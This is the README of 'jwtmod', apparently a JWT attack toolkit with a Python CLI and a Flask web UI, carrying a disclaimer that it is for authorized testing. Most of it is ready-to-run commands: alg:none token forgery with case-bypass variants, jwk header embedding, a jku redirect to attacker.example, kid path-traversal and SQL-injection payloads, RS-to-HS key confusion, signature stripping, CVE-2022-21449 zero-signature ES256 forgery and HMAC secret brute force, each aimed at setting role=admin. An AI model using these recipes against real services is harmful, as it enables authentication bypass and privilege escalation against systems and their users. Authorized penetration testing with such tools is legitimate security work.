# jwtmod

A small JWT security testing toolkit. Ships as a Python CLI and a local Flask
web UI that runs the attacks entirely in your browser via WebCrypto.

> **For authorized security testing only.** Most of what this tool does is an
> authentication bypass against badly-configured verifiers. Don't point it at
> systems you don't own or aren't explicitly allowed to test.

## What's in the box

- **Claim editing** — `--set`, `--remove`, `--merge-json`, dotted paths, JSON
  value coercion, and named presets (`expire`, `extend-exp=N`, `perma`,
  `clear-time`, `admin`).
- **Real signing** — HS256/384/512, RS256/384/512, PS256/384/512,
  ES256/384/512, `none`.
- **Attack recipes** — `alg:none` (with case-bypass variants), `jwk` header
  embed, `jku` redirect, `kid` injection, RS→HS key-confusion, signature
  stripping, ES256 "psychic signature" (r=s=0), duplicate-claim parser
  confusion.
- **Inspection** — `info` (claim summary + warnings), `diff` between two tokens.
- **Brute force** — HS* verification loop against a bundled ~1k-secret
  wordlist or your own.

## Install

```bash
python3 -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt
```

`cryptography` is required for the asymmetric algorithms. Flask is only needed
for the web UI.

## CLI

The CLI uses subcommands. The legacy single-shot `python3 cli.py <jwt> --set ...`
form still works as an `alg:none` alias.

### Inspect

```bash
python3 cli.py decode "$JWT"
python3 cli.py info   "$JWT"
python3 cli.py diff   "$JWT_OLD" "$JWT_NEW"
```

### Modify claims

`modify` keeps the original signature segment as-is — useful when you want to
edit a token then feed it to a verifier that doesn't actually check the
signature.

```bash
python3 cli.py modify "$JWT" --set role=admin --remove exp
python3 cli.py modify "$JWT" --preset admin --preset clear-time
python3 cli.py modify "$JWT" --merge-json '{"scope":"*","aud":["api"]}'
python3 cli.py modify "$JWT" --set user.deleted=false   # dotted path
```

Presets:

| Preset                | Effect                                                 |
| --------------------- | ------------------------------------------------------ |
| `expire`              | `exp = now - 60`                                       |
| `extend-exp=SECONDS`  | bump `exp` by N seconds (default 3600)                 |
| `perma`               | `exp = now + 10 years`                                 |
| `clear-time`          | drop `exp`, `nbf`, `iat`                               |
| `admin`               | force `role=admin`, `isAdmin=true`, plus existing keys |

`--preset admin:keys=role,isAdmin,groups` narrows which keys the preset sets.

### Forge tokens

```bash
# alg:none, with the classic case-bypass variants:
python3 cli.py forge none "$JWT" --set role=admin
python3 cli.py forge none "$JWT" --alg-literal None
python3 cli.py forge none "$JWT" --alg-literal nOnE --no-trailing-dot
python3 cli.py forge none "$JWT" --keep-header-extras

# Re-sign with any supported alg. `--secret` accepts a literal, @file, or 0xHEX.
python3 cli.py forge sign "$JWT" --alg HS256 --secret hunter2 --set role=admin
python3 cli.py forge sign "$JWT" --alg HS512 --secret @secret.bin
python3 cli.py forge sign "$JWT" --alg RS256 --key priv.pem --kid kid-1
python3 cli.py forge sign "$JWT" --alg ES384 --key ec.pem
```

### Attacks

Each attack recipe accepts the same payload flags (`--set`, `--remove`,
`--merge-json`, `--preset`) and the global `--json` flag for machine output.

```bash
# 1) jwk header embed — verifier trusts the public JWK in the header.
python3 cli.py attack jwk-embed "$JWT" --set role=admin --out-priv attacker.pem

# 2) jku — verifier fetches the JWKS at a URL we control.
python3 cli.py attack jku "$JWT" \
  --url https://attacker.example/.well-known/jwks.json \
  --out-jwks jwks.json --out-priv attacker.pem \
  --set role=admin

# 3) kid injection — path/SQL payloads + empty-secret HS256.
python3 cli.py attack kid "$JWT" --value '../../../../dev/null' --set role=admin
python3 cli.py attack kid "$JWT" --value "' UNION SELECT 'AAAAAAAAAAAAAAAAA'--"

# 4) RS→HS confusion — HMAC-sign with the issuer's public PEM as the key.
python3 cli.py attack rs-to-hs "$JWT" --public-key target_pub.pem --set role=admin

# 5) Strip signature — empty third segment, optionally rewriting alg.
python3 cli.py attack strip-sig "$JWT" --alg-literal none

# 6) Psychic ES256 (CVE-2022-21449 class) — r=s=0.
python3 cli.py attack psychic-es256 "$JWT" --set role=admin
```

### Verify

```bash
python3 cli.py verify "$JWT" --alg HS256 --secret hunter2   # exits 0/1
python3 cli.py verify "$JWT" --alg RS256 --key issuer_pub.pem
```

### Brute force HS* secrets

```bash
# Bundled top wordlist (~1k entries):
python3 cli.py brute "$JWT"

# Custom wordlist, capped at 100k tries:
python3 cli.py brute "$JWT" --wordlist big.txt --max 100000
```

### Stdin and JSON output

```bash
echo "$JWT" | python3 cli.py modify --set role=admin
python3 cli.py forge none "$JWT" --json --set role=admin
```

## Web UI

```bash
python3 web.py            # http://127.0.0.1:5000
python3 web.py --port 8000
```

Paste a JWT, edit the payload, switch tabs to pick an attack. All signing and
verification runs locally via `SubtleCrypto`. The server only renders the page
and exposes the same operations under `/api/decode`, `/api/forge`, `/api/sign`,
`/api/verify`, `/api/info`, `/api/diff`, `/api/brute`, and
`/api/attack/<name>` for scripting parity.

## What each attack catches

| Attack             | Verifier bug exercised                                         |
| ------------------ | -------------------------------------------------------------- |
| `alg:none`         | Accepts `alg=none`, or fails to canonicalize (`None`, `NONE`). |
| Strip signature    | Skips signature check when the third segment is empty.         |
| Sign as            | Accepts an attacker-chosen algorithm.                          |
| Embed jwk          | Trusts the public JWK supplied in the header.                  |
| jku                | Fetches any URL in `jku` instead of an allowlist.              |
| kid injection      | Reads the file at `kid` and HMACs with its contents.           |
| RS→HS confusion    | Reuses the issuer's public PEM as an HMAC secret.              |
| Psychic ES256      | Accepts r=s=0 ECDSA signatures (CVE-2022-21449 class).         |
| Brute force        | Weak HMAC secret (default, demo, dictionary word).             |

## Out of scope

- JWE (encrypted JWT) is not implemented — separate spec surface.
- The `jku` attack generates a JWKS file; hosting it at the URL is up to you.
- No packaging / GUI bundling. Run via `python3 cli.py` and `python3 web.py`.
